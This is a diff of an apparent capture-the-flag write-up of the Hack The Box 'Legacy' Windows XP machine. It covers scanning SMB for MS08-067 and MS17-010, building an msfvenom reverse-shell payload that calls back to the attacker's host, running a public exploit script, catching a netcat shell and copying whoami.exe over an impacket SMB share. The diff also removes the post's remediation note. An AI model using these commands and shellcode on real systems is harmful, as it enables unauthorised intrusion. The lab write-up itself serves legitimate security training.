@@ -11,7 +11,6 @@ series = []
 weight = 9
 +++
 
-
 # Machine info
 
 - OS : Windows
@@ -19,16 +18,16 @@ weight = 9
 - Points : 20
 - IP : 10.10.10.4
 
-
 # Mind Map
 ![Legacy_MindMap](/images/htb/legacy_mindmap.png)
 
+&nbsp;
 
-# Reconnaisance
+# Recon
 
-First of all, let's see the `nmap` scan result:
+Let's see the `nmap` scan result:
 
-{{< highlight html >}}
+```
 Nmap scan report for 10.10.10.4
 Host is up (0.068s latency).
 Not shown: 997 filtered ports
@@ -54,15 +53,17 @@ Host script results:
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
-{{< /highlight >}}
+```
 
-So I have as open ports only the `139` and `445`.
+We have as open ports only the `139` and `445`.
+
+&nbsp;
 
 # Enumeration
 
 Let's conduct a script scan versus the SMB service to see if it is vulnerable to a known exploit:
 
-{{< highlight html >}}
+```
 nmap --script smb-vuln* 10.10.10.4 -p 445 -n
 
 Nmap scan report for 10.10.10.4
@@ -101,20 +102,22 @@ Host script results:
 |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                                                         
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                                                                                    
 |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
-{{< /highlight >}}
+```
 
-**->** SMB appears to be vulnerable to the well known **MS08-067** and **MS17-010**. At this point I have to choose a way to proceed. I will exploit the `MS08-067` vulnerability without Metasploit.
+**->** SMB appears to be vulnerable to the well known **MS08-067** and **MS17-010**. We will exploit the `MS08-067` vulnerability without Metasploit.
 
-**Note**: There are 2 modules (for both the vulnerabilities) available in Metasploit.
+**Note**: There are 2 modules (for both the vulnerabilities) available in Metasploit that can perform the exploitation automatically.
 
+
+&nbsp;
 
 # Exploitation
 
-After doing some research on the web, I found this python script that exploits **MS08-067**: https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py.
+On the web we can find different exploit scripts: https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py.
 
-After reading the code, I can see that the exploit requires me to replace the default shellcode with a custom one. To make the shellcode, I use the following options in msfvenom:
+After reading the code, we can see that the exploit requires us to replace the default shellcode with a custom one. To make the shellcode, we can use the following options in `msfvenom`:
 
-{{< highlight html >}}
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -v shellcode
 
 Found 11 compatible encoders
@@ -152,25 +155,25 @@ unsigned char shellcode[] =
 "\x3f\xb6\x16\x18\xdd\x49\xa7\x90\x66\xf6\x10\x65\x3f\xb6\x91"
 "\xfe\xbc\x69\x2d\x03\x20\x16\xa8\x43\x87\x70\xdf\x97\xaa\x63"
 "\xfe\x07\x15";
-{{< /highlight >}}
+```
 
 Where:
 - `-p` specifies the payload I want to use
 - `LHOST` and `LPORT` are the IP address assigned to my machine
-- `EXITFUNC` appears to be an important option here, as stated in the exploit code
+- `EXITFUNC` will be useful in some cases where after you exploited a box, you need a clean exit
 - `-b` specifies the bad characters for the payload
 - `-f` specifies the output, in this case it will be `C`
 - `-a` specifies the system architecture
 - `-v` specifies the variable that will store the payload
 
-At this point I have to edit the exploit file including my own payload and set up a listener on port 443.
-The exploit requires that I know the version of Windows and the Language Pack. Apparently the exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell. For different version of Windows, the addresses of those gadgets will be different.
+At this point we have to edit the exploit file including our own payload and set up a listener on port 443.
+The exploit requires that we know the version of Windows and the Language Pack. Apparently the exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell. For different version of Windows, the addresses of those gadgets will be different.
 
-From the initial scan result I know that the system is running a **Windows XP version**. So I will start with target 6 first (Win XP SP3 English), and if that fails, I'll try others.
+From the initial scan result we know that the system is running a **Windows XP version**. We will start with target `6` first (Win XP SP3 English), and if that fails, we'll try others.
 
-Let's run the exploit: (I have already set up a netcat listener on port 443)
+Let's run the exploit: (setting up a netcat listener on port 443)
 
-{{< highlight html >}}
+```
 python exploit.py 10.10.10.4 6 445
 #######################################################################
 #   MS08-067 Exploit
@@ -200,11 +203,11 @@ Windows XP SP3 English (NX)
 [-]Initiating connection
 [-]connected to ncacn_np:10.10.10.4[\pipe\browser]
 Exploit finish
-{{< /highlight >}}
+```
 
-And I get a shell:
+And we get a shell:
 
-{{< highlight html >}}
+```
 nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.4] 1031
@@ -212,20 +215,20 @@ Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
-{{< /highlight >}}
+```
 
-`Windows XP` doesn't have a `whoami` command. So, how can I know which user am I?
+`Windows XP` doesn't have a `whoami` command. So, how can we know which kind of user are we?
 
-{{< highlight html >}}
+```
 C:\WINDOWS\system32>whoami
 whoami
 'whoami' is not recognized as an internal or external command,
 operable program or batch file.
-{{< /highlight >}}
+```
 
-Kali has a `whoami.exe` by default under `/usr/share/windows-resources/binaries`/. I can share the executable with the target machine via SMB:
+Kali has a `whoami.exe` by default under `/usr/share/windows-resources/binaries`/. we can share the executable with the target machine via SMB:
 
-{{< highlight html >}}
+```
 python3 /opt/impacket/examples/smbserver.py whoami /usr/share/windows-binaries/
 Impacket v0.9.19 - Copyright 2018 SecureAuth Corporation
 
@@ -235,19 +238,13 @@ Impacket v0.9.19 - Copyright 2018 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed
-{{< /highlight >}}
+```
 
 On the target:
 
-{{< highlight html >}}
+```
 C:\WINDOWS\system32>copy \\10.10.14.14\whoami\whoami.exe
 NT AUTHORITY\SYSTEM
-{{< /highlight >}}
-
-I'm already **SYSTEM**, so there is no need to proceed with privilege escalation!
+```
 
 **Note**: flags are under `C:\Documents and Setting\john` and `C:\Documents and Setting\Administrator`.
-
-## Lessons learned and remediations
-
-- The target system appears to be vulnerable to 2 well known vulnerabilities. The administrator should have patched the system against this well known type of attacks.
